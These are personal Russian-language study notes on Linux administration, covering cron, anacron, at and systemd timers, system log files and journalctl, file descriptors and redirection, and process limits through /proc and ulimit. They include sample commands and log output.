/etc/cron.monthly - каждый месяц.
В этих папках должны находиться скрипты, которые нужно выполнять с указанным интервалом.
Скрипты должны иметь права на выполнение и их имя не должно содержать точки. 
Это очень сильно облегчает работу с планировщиком для новых пользователей.
!!Редактировать файл /etc/crontab не рекомендуется. 
  *!* Вместо этого, есть команда crontab: *!*
 crontab -e. Ее всегда желательно выполнять с опцией -e, тогда для редактирования правил 
  будет использован ваш текстовый редактор по умолчанию. Команда открывает вам временный файл,
  в котором уже представлены все текущие правила cron и вы можете добавить новые. 
 После завершения работы команды cron файл будет обработан и все правила будут добавлены в
  /var/spool/cron/crontabs/
$ crontab -e
* * * * * /usr/local/bin/serve // задать serve каждую минуту каждого часа каждого дня 365/год
5 * * * * killall iperf3 // задать в пять минут каждого часа выгружать iperf3 
0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ //Архивировать в 5 am every week /home/
crontab: installing new crontab

Чтобы указать определенный интервал нужно использовать символ "-", например, каждый час,
с семи утра до семи вечера:    0 7-19  * * * /usr/local/bin/serve
Если нужно запустить команду несколько раз, можно использовать разделитель ",".
Например, запустим скрипт в 5 и 35 минут пятого (16:05 и 16:35), каждый день:
5,35 16  * * * /usr/local/bin/serve
Вы можете захотеть не указывать отдельно время, а просто указать интервал, с которым 
нужно запускать скрипт, например, раз в 10 минут. Для этого используется разделитель косая черта - "/":
*/10 * * * * /usr/local/bin/serve
Для некоторых часто используемых наборов были придуманы переменные:
@reboot - при загрузке, только один раз;
@yearly, @annually - раз год;
@monthly - раз в месяц;
@weekly - раз в неделю;
@daily, @midnight - каждый день;
@hourly - каждый час.
* * * * * dtime="/tmp/file$(date)"; touch "$dtime"; echo "$(date)" >> "$dtime"
// каждую минуту часа 365/год создавать файл с названием и содержание текущей даты-время
5 * * * * killall iperf3 // задать в пять минут каждого часа выгружать iperf3 
$ service cron restart // обновить демон планировшика 


 - - Аnacron vs Cron - - -
 Также в файле crontab прописан запуск команды Аnacron (асинхр.cron),которая работает такжекак cron,
 только предназначена для задач, которые нужно выполнять раз в длительный период, например,
 раз в день, неделю, месяц, год. Аnacron позволяет выполнять их даже если компьютер работает 
 не всегда и время от времени выключается. Дата выполнения задания последний раз записывается 
 в файл /var/spool/anacron, а затем, при следующем запуске anacron проверяет был ли запущен 
 нужный процесс в нужное время, и если нет, то запускает его. Сам же сервис cron больше рассчитан
 на выполнение задач в течение дня или с точно расписанным временем и датой.

 = = Crone 2, at, batch, Аnacron, timers systemd = =
37. Планировщики задач — Основы GNU_Linux и подготовка к RHCSA.mhtml

at - однокраьное ыполнение заданий см 

at 23:00
systemctl stop database
reboot

Демон, который стоит за работой at: systemctl status atd
По умолчанию существует пустой файл /etc/at.deny - это говорит о том, что всем пользователям разрешено использовать at. Если создать at.allow, то только пользователи, указанные в этом файле, будут иметь возможность использовать at. 
В документации к at также указана команда batch. Она может пригодится на серверах, когда вы хотите
запустить какую-то программу, но сервер слишком нагружен. batch - работает как at, но без указания
времени. Она следит за средней нагрузкой сервера - load average - и когда нагрузка упадёт меньше
указанного лимита, по умолчанию это 0.8 - uptime, то batch выполнит указанную вами команду. 
Лимит можно настроить в файле /etc/sysconfig/atd. !!

cron 
ут мы видим оболочку, в которой будут выполняться наши команды, переменную PATH и MAILTO - кому будут отправляться письма о выполнении. 
crontab -e 
crontab -l
https://crontab.guru/ калькулятор шаблонов cron
cron.hourly, cron.daily, cron.weekly и cron.monthly. Когда у вас есть скрипт, который нужно
 выполнять регулярно, при этом не важно, в какую именно минуту, вы можете закинуть 
такой скрипт в соответствующую директорию. Для примера, так работает logrotate:
cat /etc/cron.daily/logrotate. у него нет своего демона, его раз в день запускает cron
cat /etc/cron.hourly/0anacron. программа - anacron, которая также позволяет планировать задачи. 
представьте, что в cron-е написано сделать бэкап в полночь. НО если я вечером выключил компьютер,
а утром включил, то НЕ дожидаясь следующей полночи anacron запустит ее.
И если, скажем, вы в anacron настроите бэкап раз в день, то, если компьютер будет выключен в 
запланированное для бэкапа время, бэкап будет сделан после включения.
 cat /etc/anacrontab - файл настройки anacron. програма демона /usr/sbin/anacron -d
                *** Таймеры timers systemd ***
В systemd встроен функционал планировщика задач, который выполнен в виде unit-ов
systemctl list-timers
Есть простой способ создать таймеры, хотя и временные:
systemd-run --on-calendar=hourly /bin/touch /tmp/file
systemctl cat run-u562.timer
systemctl cat run-u562.service
При этом создаётся и таймер, и сервис, но это всё существует, пока не выполнится временное условие, 
либо пока не перезагрузится сервер. Простой пример - таймер, который раз в час запускает 
touch file. Но, опять же, это временный таймер, постоянные таймеры надо создавать по другому.
!!! Использование таймеров systemd вместо заданий cron !! изучить:
https://habr.com/ru/companies/ruvds/articles/512868/







https://ru.manpages.org/openat/2 ВОЗВРАЩАЕМОЕ ЗНАЧЕНИЕ
Вызовы open(), openat() и creat() возвращают новый дескриптор файла или "-1" в случае ошибки
  (в этом случае errno устанавливается в соответствующее значение).

		= = =  Журналы Linux:    = = -
 Журналы расположены:    /var/log/dmesg /var/log/syslog /var/log/kern.log 
+ Журнал mtab (таблицу смотированных автоматически и вручную FS)
 /etc/mtab // просмотр файла смонтированных файловых систем
less /run/mount/utab // просмотр файла-журнала смонтированных устройствUSB (НЕ! отображает метадиски!)
  SRC=/dev/sdb2 TARGET=/media/oem/uflsh2 ROOT=/ OPTS=uhelper=udisks2
также см fstab

https://habr.com/ru/companies/otus/articles/714266/
Журналы /var/log/syslog или /var/log/messages — глобальный системный журналa.
  Cохраняются сообщения ядра и программ/
  В нем мы можем найти события, произошедшие с момента запуска системы от
   различных компонентов ОС — ядра, служб, устройств и т. д.
/var/log/kern.log — содержит сообщения от ядра и предупреждения,
   которые могут быть полезны при устранении ошибок, произошедших при работе пользовательских модулей встроенных в ядро.
/var/log/auth.log или /var/log/secure — наиболее интересны для безопасников, 
  так как они содержат информацию об авторизации пользователей, то есть попытки не/успешных входов
    в систему и методов аутентификации.
/var/log/dmesg. События от оборудования и драйверов устройств находятся в файле  
     В этом файле фиксируются ошибки работы драйверов и оборудования. 
см !ниже раздел! "* * udev logs (/var/log/dmesg) * *"
в файле /var/log/anaconda.log  События установки системы можно найти 
В файле /var/log/boot.log находятся логи загрузки системы.
/var/log/audit — лог демона auditd. Еще один журнал событий, который представляет особый интерес для специалистов по информационной безопасности это 
  Логирование аудита мы еще рассмотрим далее в этой статье.
Журнал демона crond /var/log/cron — содержит результаты выполнения различных событий планировщика задач cron.
Это основные журналы событий, которые есть в большинстве дистрибутивов Linux. Также в зависимости от установленных приложений в /var/log/ могут находиться логи БД MySQL или веб серверов Apache/Nginx.

 /var/log/syslog https://www.rsyslog.com/doc/master/index.html

https://habr.com/ru/articles/332502/
Файлы журналов можно отнести к одной из следующих категорий: приложения; события; службы; системный.
Большинство же лог файлов содержится в директории /var/log
/var/log/syslog или /var/log/messages содержит глобальный системный журнал, в котором пишутся сообщения с момента запуска системы, от ядра Linux, различных служб, обнаруженных устройствах, сетевых интерфейсов и много другого.
/var/log/auth.log или /var/log/secure — информация об авторизации пользователей, включая удачные и неудачные попытки входа в систему, а также задействованные механизмы аутентификации.
/var/log/dmesg — драйвера устройств. Одноименной командой можно просмотреть вывод
  содержимого файла. Размер журнала ограничен, когда файл достигнет своего предела, 
  старые сообщения будут перезаписаны более новыми. Задав ключ --level= можно отфильтровать
  вывод по критерию значимости.
/var/log/boot.log — Информация, которая пишется при загрузке операционной системы.
/var/log/cron — Отчет службы crond об исполняемых командах и сообщения от самих команд.
/var/log/cups — Все, что связано с печатью и принтерами.
/var/log/faillog — Неудачные попытки входа в систему. Очень полезно при проверке угроз в системе безопасности, хакерских атаках, попыток взлома методом перебора. Прочитать содержимое можно с помощью команды faillog.
var/log/kern.log — Журнал содержит сообщения от ядра и предупреждения, которые могут быть полезны при устранении ошибок пользовательских модулей встроенных в ядро.
/var/log/maillog/ или /var/log/mail.log — Журнал почтового сервера, используемого на ОС.
/var/log/pm-powersave.log — Сообщения службы экономии заряда батареи.
/var/log/samba/ — Логи файлового сервера Samba, который используется для доступа к общим папкам Windows и предоставления доступа пользователям Windows к общим папкам Linux.
/var/log/Xorg.0.log — Логи X сервера. Чаще всего бесполезны, но если в них есть строки начинающиеся с EE, то следует обратить на них внимание.
/var/log/dpkg.log — журнал менеджера пакетов. 
бинарные журналы
/var/log/lastlog — Последняя сессия пользователей. Прочитать можно командой last.

/var/log/btmp — Еще один журнал записи неудачных попыток входа в систему.
    Просто так, на всякий случай, если вы еще не догадались где следует искать 
     следы активности взломщиков.
/var/log/19:54 9/2/2023 — Список входов пользователей в систему на данный момент.
/var/log/wtmp — Еще один журнал записи входа пользователей в систему. Вывод на экран командой utmpdump.

Отдельная утиллита чтения и анализа log файлов — lnav
/var/log/mysql/ — Лог базы данных MySQL.
/var/log/httpd  Лог сервера apache

                    = * = * = Утилиты чтения журналов    = * = * =
1)journalctl // вывод из системного журнала systemd !!!(СМ НИЖЕ подробно)
journalctl -u ssh.service // вывод логов конктетного сервиса юнита unit systemd
-- Logs begin at Tue 2015-03-31 17:29:27 CEST, end at Tue 2015-03-31 17:30:36 CEST. --
Mar 31 17:29:27 mirtuel sshd[424]: Server listening on 0.0.0.0 port 22.
Mar 31 17:29:27 mirtuel sshd[424]: Server listening on :: port 22.
Mar 31 17:29:29 mirtuel sshd[424]: Received SIGHUP; restarting.
Mar 31 17:30:10 mirtuel sshd[1147]: Accepted password for roland from 192.168.1.129 port 38742 ssh2
Mar 31 17:30:10 mirtue
journalctl -uf ssh.service // -f отслеживание сообщений в realtime

2)/usr/bin/dmesg -wH // утилита чтения отладочных сообщений из буфера ядра ОС (с самого начало от загрузки)
3)/usr/bin/udevadm monitor // чтение сообщений от демона udevd (cv ниже)
4) last | tail -10  // команда чтения записей из журналов входа  /var/log/wtmp /var/log/lastlog 
oem      pts/1        192.168.100.13   Sat Mar 11 16:17 - 16:46  (00:28)
oem      tty7         :0               Sat Mar 11 16:16 - 17:03  (00:47)
reboot   system boot  5.15.0-56-generi Sat Mar 11 16:16 - 17:03  (00:47)
oem      tty7         :0               Sat Mar 11 15:37 - 16:15  (00:37)
5)  lastlog // команда чтения из журналов из /var/log/lastlog  (список завершённых сеансов работы с системой)
  о последних входах с систему  для всех пользователей
Пользователь     Порт     С                Последний раз
root                                       **Никогда не входил в систему**
daemon                                     **Никогда не входил в систему**
oem              pts/0    192.168.100.3    Сб сен  2 19:15:52 +0300 2023
sssd                                       **Никогда не входил в систему**
sshd                                       **Никогда не входил в систему**
mvn              pts/1    192.168.100.13   Ср апр 26 15:45:21 +0300 2023
6) отдельное ПО -  lnav (удалить из системы)

mint@mint:~$ tail -5 /var/log/kern.log  // соодщение о подключении и отключении sdb  usb-накопителя
Feb 13 17:21:15 mint kernel: [ 6463.284107] EXT4-fs (sdb1): mounting ext3 file system using the ext4 subsystem
Feb 13 17:21:15 mint kernel: [ 6463.710502] EXT4-fs (sdb1): recovery complete
Feb 13 17:21:15 mint kernel: [ 6463.720724] EXT4-fs (sdb1): mounted filesystem with ordered data mode. Opts: errors=remount-ro. Quota mode: none.
Feb 13 17:21:21 mint kernel: [ 6469.282534] ntfs3: Unknown parameter 'windows_names'
Feb 13 18:14:27 mint kernel: [ 9655.342837] sdb: detected capacity change from 4030464 to 0


$ grep cron  /var/log/syslog | tail -5 // просмотр syslog - в части отработки cron 
Feb 14 02:17:01 mint CRON[13184]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
Feb 14 03:17:01 mint CRON[14132]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
$ grep cron /var/log/syslog // логи добавления записей через  cronetab
Feb 14 00:20:52 mint crontab[12721]: (mint) BEGIN EDIT (mint) 
Feb 14 00:22:10 mint crontab[12721]: (mint) REPLACE (mint)
Feb 14 00:22:10 mint crontab[12721]: (mint) END EDIT (mint)
grep iperf  /var/log/syslog  // просмотр syslog - в части отработки killall iperf3 через cron
Feb 14 02:27:01 mint CRON[13218]: (mint) CMD (/usr/bin/killall iperf3)
Feb 14 03:01:01 mint CRON[13556]: (mint) CMD (/usr/bin/killall iperf3) 




/var/log/syslog
May 29 21:48:06 LnxPC systemd[1]: Created slice User Slice of UID 29999.
May 29 21:48:06 LnxPC systemd[1]: Starting User Runtime Directory /run/user/29999...
May 29 21:48:06 LnxPC systemd[1]: Finished User Runtime Directory /run/user/29999.
May 29 21:48:06 LnxPC systemd[1]: Starting User Manager for UID 29999...
May 29 21:48:07 LnxPC systemd[872]: Queued start job for default target Main User Target.
May 29 21:48:07 LnxPC dbus-daemon[640]: [system] Activating via systemd: service name='org.freedesktop.RealtimeKit1' unit='rtkit-daemon.service' requested by ':1.24' (uid=29999 pid=880 comm="/usr/bin/pipewire " label="unconfined")
May 29 21:48:07 LnxPC systemd[872]: Created slice User Application Slice.
May 29 21:48:07 LnxPC dbus-daemon[640]: [system] Successfully activated service 'org.freedesktop.RealtimeKit1'

/var/log/dmesg  // журнал отладочных сообщений из буфера ядра ОС 
[    0.000000] kernel: KERNEL supported cpus:
[    0.000000] kernel:   Intel GenuineIntel
[    0.000000] kernel:   AMD AuthenticAMD
[    0.000000] kernel:   Hygon HygonGenuine
[    0.000000] kernel:   Centaur CentaurHauls
[    0.000000] kernel:   zhaoxin   Shanghai
[    0.000000] kernel: [Firmware Bug]: TSC doesn't count with P0 frequency!
[    0.000000] kernel: x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'

[    0.000000] kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.000000] kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' format.
[    0.000000] kernel: signal: max sigframe size: 1776
[    0.000000] kernel: BIOS-provided physical RAM map:


***journalctl - утилита Systemd чтения из двоичных журналов /var/log/journal ***
man    journalctl may be used to query the contents of the systemd(1) journal as written by systemd-journald.service
(8).  journalctl - утилита Systemd! для запроса контента журнала, в который пишет !systemd-journald.service!
man journalctl - используется для запроса к содержимому systemd(1) журнала, наполняемого 
	 службой systemd-journald.service(8).
strace -e openat journalctl //!открывает множество двочных файлов
        журналов  в /var/log/journal/8283e071490343188007b10cb544d01b/
  openat(AT_FDCWD, "/var/log/journal/8283e071490343188007b10cb544d01b/system@000601171cf4337f-5b94a574185b2021.journal~", O_RDONLY|O_NONBLOCK|O_CLOEXEC) = 68


journalctl // вывод из системного журнала systemd , ПОЛЕЗНО ПРИ ЗАПУСКЕ ОСТАНОВЕ СЛУЖБ
journalctl -b -2 // вывод лого  kernel ядра за 2 загрузки системы назад 
sudo journalctl -ek  // вывод последних логов ядра
journalctl -p err -k // вывод логов ядра со статусом error
ноя 16 22:46:01 LnxPC kernel: sd 2:0:0:0: [sdc] No Caching mode page found
ноя 16 22:46:01 LnxPC kernel: sd 2:0:0:0: [sdc] Assuming drive cache: write through
journalctl -p warning -k //вывод логов ядра со статусом warning
ноя 16 22:46:01 LnxPC kernel: [Firmware Bug]: TSC doesn't count with P0 frequency!

journalctl -xeu networking.service // вывод записей для службы  networking.service
journalctl -eu systemd-udevd.service // логи от сервиса udevd
journalctl | tail -660 | grep sshd // вывод из системного журнала systemd инф о процессе sshd
    // 17:51 - запуск sshd, 7:56 - ввод пароля
апр 01 17:51:12 LnxPC sshd[761]: Server listening on 0.0.0.0 port 22.
апр 01 17:51:12 LnxPC sshd[761]: Server listening on :: port 22.
апр 01 17:51:13 LnxPC systemd[814]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
апр 01 17:51:13 LnxPC gpg-agent[960]: using fd 3 for ssh socket (/run/user/29999/gnupg/S.gpg-agent.ssh)
апр 01 17:51:13 LnxPC gpg-agent[960]: listening on: std=4 extra=5 browser=6 ssh=3
апр 01 17:51:13 LnxPC gpg-agent[963]: using fd 3 for ssh socket (/run/user/29999/gnupg/S.gpg-agent.ssh)
апр 01 17:51:13 LnxPC gpg-agent[963]: listening on: std=4 extra=5 browser=6 ssh=3
апр 01 17:56:47 LnxPC sshd[1481]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.100.13  user=oem
апр 01 17:56:49 LnxPC sshd[1481]: Failed password for oem from 192.168.100.13 port 49995 ssh2
апр 01 17:56:54 LnxPC sshd[1481]: Accepted password for oem from 192.168.100.13 port 49995 ssh2
апр 01 17:56:54 LnxPC sshd[1481]: pam_unix(sshd:session): session opened for user oem(uid=29999) by (uid=0)

 https://losst.pro/shpargalka-po-journalctl-v-linux?featurl=1
в лог journalctl (часть systemd) пишутся сообщения при старте сервисов, а также различные системные сообщения.
1. Просмотр логов сервисов/ Самый частый случай использования journalctl - это когда пытаетесь запустить
 какой-либо сервис с помощью systemd, он не запускается и systemd выдает вам такое сообщение 
подобного содержания: Failed to start service use journalctl -xe for details.
Система сама предлагает вам какую команду надо выполнить: sudo journalctl -xe
2. Чтобы отфильтровать сообщения только от определенного сервиса можно использовать опцию -u. Например:
 sudo journalctl -eu apache2.service
 
journalctl -u ssh.service // вывод логов конкретного сервиса юнита unit systemd
-- Logs begin at Tue 2015-03-31 17:29:27 CEST, end at Tue 2015-03-31 17:30:36 CEST. --
Mar 31 17:29:27 mirtuel sshd[424]: Server listening on 0.0.0.0 port 22.
3.выводить новые сообщения в реальном времени: 
 sudo journalctl -f
4.чтобы открыть лог последней загрузки используйте опцию -b: 
  sudo journalctl -b
5.список всех сохраненных загрузок OC/PC командой: 
  sudo journalctl --list-boots
6. указать дату и время, начиная с которой нужно отображать логи: sudo journalctl --since "2019-01-20 15:10:10"
 указать по какую дату вы хотите получить информацию: sudo journalctl -e --until "2019-01-20 15:05:50"
7. посмотреть только сообщения ядра используйте опцию -k(-e - последние сообщения): 

   sudo journalctl -ek  !!!!!!!!!!!!!!!!!!!!!

8. посмотреть сколько ваши логи занимают на диске. Для этого используйте такую команду: 
sudo journalctl --disk-usage
чтобы ваши файлы журналов занимали на диске не более 2 Гб, выполните команду: 
sudo journalctl --vacuum-size=2G
оставим только логи за последний год: journalctl --vacuum-time=1years
9 Настройка формата вывода
По умолчанию journalctl выводит информацию с помощью утилиты less, в которой вы можете её удобно листать и просматривать. Но формат вывода можно изменить:
short - используется по умолчанию;
verbose - также, как и short, только выводится намного больше информации;
json - вывод в формате json, одна строка лога в одной строке вывода;
json-pretty - форматированный вывод json для более удобного восприятия;
cat - отображать только сообщения, без метаданных.
Чтобы указать нужный формат используйте опцию -o

sudo journalctl -ek  //= равносильно less  tail -10 /var/log/kern.log
    = = *** = = END journalctl - утилита Systemd  = = *** = =
   
        = = =  END Системные ЖУРНАЛЫ /LOGS/ЛОГИ ПЛАНИРОВЩИК = = = =


------------------------ ФАЙЛЫ ДЕСКРИПТОРЫ ПРОЦЕССы ПОТОКИ(НИТИ!)------------------
!Псевдофайловые системы proc и dev sys - директории, создаваемые только в процекссе работы операц. системы (ядра), НЕ сохраняются на диске после завершения работы системы

file f1 // показать тип файла f1
stat f1 // показать статус f1, права в формате ugo, Uid, Inode   
echo $$  // номер процесса текущего терминала
uptime // сколько времени запущено ядро ОС
lspci // список всх pci устройств
lsusb // список всх usb устройств
Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
Bus 002 Device 031: ID 80ee:0021 VirtualBox USB Tablet
Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub

Кетов Книга 3.3. Файловые дескрипторы !!!!!!!!!!!!!!!!!!!!!!!!!!
Основными операциями, предоставляемыми ядром операционной ПРОЦЕССАМ! для работы с файлами, являются системные вызовы open read, write и close. Дополнительный системный вызов ioctl (input output control) используется для управления ДРАЙВЕРАМИ! устройств и, как следствие, применяется в основном для специальных файлов устройств.
При запросе процесса на открытие файла системным вызовом ореn производится  его однократный (относительно медленный, см. разд. 3.2.2) поиск имени файла в  дереве каталогов и для запросившего процесса создается так называемый файловый дескриптор (описатель, от англ. descriptor).
Файловый дескриптор «содержит»:
1 информацию, описывающую файл, например индексный дескриптор i-node файла на файловой системе
2 номера major и minor устройства, на котором располагается файловая система файла
3 режим открытия файла, и прочую служебную информацию.
При последующих операциях read(2) и write(2) доступ к самим данным файла происходит с использованием файлового дескриптора (что исключает медленный поиск файла в дереве каталогов). 
Файловые дескрипторы пронумерованы и содержатся в таблице открытых процессом файлов (FD), которую можно получить при помощи диагностической  программы lsof(1). В обратную сторону получить список процессов, открывших тот  или иной файл, можно при помощи программ lsof(1) и fuser(1), что бывает полезно для идентификации программ, «занявших» файловую систему, подлежащую отмонтированию !!! 
Номера файловых дескрипторов колкальны для процесса!
touch /tmp/123
tee -a /tmp/123 & // открыть файл в интерактивной режиме для добавления и перевести в фон 
  [2] 2044
lsof -p 2044  // список файлов и их файловых дескрипторов (FD), открытых  процессом -p PID 
                 // !через ssh не всегда корректно работает! 
              // в данном случае для процесса tee открыты, в частности, 4 FD
 0u 1u  2u - стандартные потоки ввода(0) , вывода(1) и ошибок(2) для псевдотерминала /dev/pts/1
 3w - непосредственный FD файла, который отрыл процесс tee  /tmp/123

COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME
tee     2044  oem  cwd    DIR    8,1     4096 573587 /home/oem
tee     2044  oem  rtd    DIR    8,1     4096      2 /
tee     2044  oem  txt    REG    8,1    35328 135883 /usr/bin/tee
tee     2044  oem  mem    REG    8,1   481218 419867 /usr/share/locale-langpack/ru/LC_MESSAGES/coreutils.mo
tee     2044  oem  mem    REG    8,1 8313040 139491 /usr/lib/locale/locale-archive
tee     2044  oem  mem    REG    8,1 2216304 269409 /usr/lib/x86_64-linux-gnu/libc.so.6
tee     2044  oem  mem    REG    8,1   27002 661377 /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
tee     2044  oem  mem    REG    8,1  240936 269018 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
tee     2044  oem    0u   CHR  136,1     0t0      4 /dev/pts/1
tee     2044  oem    1u   CHR  136,1     0t0      4 /dev/pts/1
tee     2044  oem    2u   CHR  136,1     0t0      4 /dev/pts/1
tee     2044  oem    3w   REG    8,1       0 943489 /tmp/123


fuser /tmp/123 // определить pid-процесса, открывшего файл
/tmp/123:             2044 

 = = = = = = = =  Перенаправления команд bash < > >> |  = = = = = = = =
В Linux библиотека libc открывает для каждого запущенного ПРОЦЕССА, запушенного через ТЕРМИНАЛ!, 3 файл дескриптора, с номерами 0,1,2  (см выше). Больше информации вы можете найти по ссылкам man stdio и man stdout
0 — стандартный поток ввода (файловый дискриптор 0
1 — стандартный поток вывода (файловый дискриптор 1)
2 — стандартный поток ошибок (файловый дискриптор 2) (https://habr.com/ru/companies/otus/articles/525012/)
stdin 0 - файл входн поток (потока ввода), stdout 1  - файл выходн потока (потока вывода), stderr 2  - файл потока ошибок  - для каждого !ПРОЦЕССА, запущенных в ТЕРМИНАЛАХ!:   /proc/PID/fd/0 /proc/PID/fd/1 /proc/PID/fd/2

ls -il /proc/2047/fd/  для процесса bash
40412 lrwx------ 1 oem oem 64 апр 25 16:30 0 -> /dev/pts/0
40413 lrwx------ 1 oem oem 64 апр 25 16:30 1 -> /dev/pts/0
40414 lrwx------ 1 oem oem 64 апр 25 16:30 2 -> /dev/pts/0
40415 lrwx------ 1 oem oem 64 апр 25 16:30 255 -> /dev/pts/0

stdin 0:  less < file   !!! перенаправление на поток 0 !!
stdin 1: ls > file;=ls 1> file; ls >> file;=ls 1>> file;   !!! перенаправление потока 1 !!
stdin 2: ls 2> file; ls 2> /dev/null; !!! перенаправление потока 2 !!
stdin 1 и 2: ls 1> file  2> file; равносильно ls &> file !!! перенаправление одновременно потока 1 и 2 !!

command1 stdin 1-> command2 stdin 0: command1 | command2 | command3  Перенаправление по конвейеру

Если процесс запущен без ТЕРМИНАЛА (bash), через GDM/GUI, например xed, то 1 и 2 FD - /dev/null!!!
lsof -p 2149
COMMAND  PID USER   FD      TYPE             DEVICE SIZE/OFF    NODE NAME
xed     2149  oem  cwd       DIR                8,1     4096  573587 /home/oem
xed     2149  oem  rtd       DIR                8,1     4096       2 /
xed     2149  oem  txt       REG                8,1    14488  136087 /usr/bin/xed
xed     2149  oem  DEL       REG                0,1               40 /SYSV00000000
..............
xed     2149  oem    0r      CHR                1,3      0t0       5 /dev/null
xed     2149  oem    1w      CHR                1,3      0t0       5 /dev/null
xed     2149  oem    2w      REG                8,1     8162  529487 /home/oem/.xsession-errors

{ Передать аргумент
ПЕРЕДАЧА аргументов И ЧТЕНИЕ ЗАЧЕНИЙ/аргументов, ПЕРЕДАННЫХ ПО КОНВЕЙЕРУ в stdin
echo file | (read a; touch '/tmp/'$a; echo '/tmp/'$a) // прочитать из конв-ра от echo "file" в
   переменную а, затем создать файл в каталоге /tmp/file  скобки () важны!

echo one1 two2 | (read a b; echo $a'+'$b;) // прочитать 2 вход параметра
one1+two2 }


 ---- ПЕРЕДАЧА ДАННЫХ МЕЖДУ ПРОЦЕССАМИ ПО ДЕСКРИПТОРАМ ФАЙЛОВ (ФАЙЛЫ, ЗДЕСЬ= ПРОЦЕССЫ) -----
см https://habr.com/ru/articles/471038/
echo "hello world" > /proc/15771/fd/0 // передать другому процессу bash (файловому дисктр 0 (STDIN) процесса с PID=15771 (др. процесс bash)) строку символов
printf "hello world" > /proc/15771/fd/0   // передать файловому дисктр 0 (STDIN) процесса с PID=15771 (др. процесс bash) строку символов
cat < /proc/15600/fd/1 // получать из файл-дескриптера 1 (STDOUT) поцесса  с PID=15600 (др. процесс bash) ПОСИМВОЛЬНО вводимые символы в окне терминала /оболочки с PID=15600 
ls -il  > /proc/15771/fd/0 -// передать другому процессу bash (файловому дисктр 0 (STDIN) процесса с PID=15771 (др. процесс bash)) список файлов ls -il

lsaaa -il  > /proc/15771/fd/0 -// передать другому процессу bash (файловому дисктр 0 (STDIN) процесса с PID=15771 (др. процесс bash)) ошибку ОС о вводе некорректн команды

В Linux библиотека libc открывает для каждого запущенного ПРОЦЕСС 3 файла дескриптора, с номерами 0,1,2. Больше информации вы можете найти по ссылкам man stdio и man stdout
Файл дескриптор 0 называется STDIN и ассоциируется с вводом данных у приложения
Файл дескриптор 1 называется STDOUT и используется приложениями для вывода данных, например командами print
Файл дескриптор 2 называется STDERR и используется приложениями для вывода данных, сообщающих об ошибке
https://habr.com/ru/post/471038/

Номера Дескрипторов файла (f)
stdin 0 stdout 1 stderr 2 - применяются при операциях с фалами cat << ,  >> , а также любыми иными командами >> (см выше ls  ls /fff/ggg/hhh > lst.txt &>ferr.txt  // НЕ ОТОБР НА ТЕРМИНАЛЕ ОШИБКУ,send err-msge в отдельном ferr.txt)

dpkg-deb //Debian package archive (.deb) manipulation tool
 dpkg -s procps 

 ##########################  ПРОЦЕССЫ  ##########################
https://losst.pro/upravlenie-protsessami-v-linux?cmdurl=1

каталог /proc/
cat cpuinfo
cat meminfo
cat /proc/1/cmdline // Файл cmdline содержит информацию о команде запуска процесса 1 - init
 /sbin/inittext  
 cat /proc/2085/cmdline  // Файл cmdline содержит информацию о команде запуска процесса 2085 - bash
  bash
                  23:23 4/4/2023 ZZZZZZZZ
cat /proc/2085/limits // ограничения для процесса
Limit                     Soft Limit           Hard Limit           Units
Max cpu time              unlimited            unlimited            seconds
Max file size             unlimited            unlimited            bytes
Max data size             unlimited            unlimited            bytes
Max stack size            8388608              unlimited            bytes
Max core file size        0                    unlimited            bytes
Max resident set          unlimited            unlimited            bytes
Max processes             7413                 7413                 processes
Max open files            1024                 1048576              files
Max locked memory         258969600            258969600            bytes
Max address space         unlimited            unlimited            bytes
Max file locks            unlimited            unlimited            locks
Max pending signals       7413                 7413                 signals
Max msgqueue size         819200               819200               bytes
Max nice priority         0                    0
Max realtime priority     0                    0
Max realtime timeout      unlimited            unlimited            us
С помощью команды ulimit и конфигурационного файла /etc/security/limits.conf вы можете ограничить процессам доступ к системным ресурсам, таким как память, файлы и процессор. Например, вы можете ограничить память процесса Linux, количество файлов и т д.
Запись в файле имеет следующий вид:<домен> <тип> <элемент> <значение>
домен - имя пользователя, группы или UID
тип - вид ограничений - soft или hard
элемент - ресурс который будет ограничен
значение - необходимый предел
Жесткие ограничения устанавливаются суперпользователем и не могут быть изменены обычными пользователями. Мягкие, soft ограничения могут меняться пользователями с помощью 	`команды ulimit.
Можем и устанавливать ограничения для текущего командного интерпретатора и создаваемых им процессов с помощью команды ulimit. Вот опции команды:
-S - мягкое ограничение
-H - жесткое ограничение
-a - вывести всю информацию
-f - максимальный размер создаваемых файлов
-n - максимальное количество открытых файлов
-s - максимальный размер стека
-t - максимальное количество процессорного времени
-u - максимальное количество запущенных процессов
-v - максимальный объем виртуальной памяти
Например, мы можем установить новое ограничение для количества открываемых файлов:  ulimit -Sn 1024 
Теперь смотрим:  ulimit -Sn
Установим лимит оперативной памяти:  ulimit -Sv 500000

----=====ЗАВИСИМОСТИ МЕЖДУ ПРОГРАММАМИ И ПРОЦЕССАМИ =====-----
                            // https://youtu.be/sQ0znZvUAdk
ldd // вывод зависимостей раздeляемых объектов (исполняемых ф-лов и библиотек) НА КАКИЕ ИЗ lib и exe ссылаются файлы ПРИ ЗАГРУЗКЕ В ПРОЦЕСС. Т.е. зависимости, которые формирует ЗАГРУЗЧИК программ в процесс (см ниже)
 // строит дерево зависимостей! Важно также при инсталляции программ 
// Кетов видео web1: файлы *.so - SharedObject = аналог библиотек dll, загружаются в процесс, являются зачастую "плагинами" 
mint@mint:~$ ldd /bin/ls //ядро загружает в процесс вместе  с ls библ-ки libc.so.6, libpcre2-8.so.0 и т.д
                     // библ-ка linux-vdso.so.1-ВООБРАЖАЕМАЯ/виртульная/псевдо библиотека,шлюз к ядру,                       часть ОЗУядра!!!
	           //библ-ка /lib64/ld-linux-x86-64.so.2 - ЗАГРУЗЧИК программ в процесс!
        linux-vdso.so.1 (0x00007ffe3a469000)
